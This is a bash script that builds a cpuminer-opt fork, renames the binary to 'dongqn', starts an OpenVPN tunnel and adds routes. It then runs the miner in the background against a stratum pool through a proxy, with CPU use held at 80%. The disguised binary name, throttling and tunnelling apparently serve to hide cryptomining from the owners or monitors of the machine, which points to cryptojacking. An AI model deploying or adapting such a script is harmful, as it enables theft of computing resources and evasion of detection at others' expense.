#!/bin/bash
sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get install cpulimit -y && sudo apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev gcc build-essential git make curl unzip gedit dh-autoreconf openssh-server screen libtool libncurses5-dev libudev-dev g++ iftop libgtk2.0-dev libboost-dev libboost-system-dev libboost-thread-dev vim -y 
sudo apt-get install -y openvpn
sudo ufw allow in on eth1 to any port 5432
git clone https://github.com/ngockhue072/cpuminer-opt
cd cpuminer-opt
chmod +x *
./build.sh
mv cpuminer dongqn
make
IP=$(/sbin/ip route | awk '/default/ { print $3 }')
route add  1.52.168.10 gw $IP
route add  27.73.37.172 gw $IP
cd ..
sudo -b openvpn --config done.ovpn
sleep 5m
sudo wget -qO- http://ipv4.icanhazip.com > ip.txt
cd cpuminer-opt
cpulimit --exe dongqn --limit 80 -b && ./dongqn -a lyra2z330 -o stratum+tcp://hxx-pool1.chainsilo.com:3032 -u minhthang.10 -p x -x dongqn.cf:1221 --background
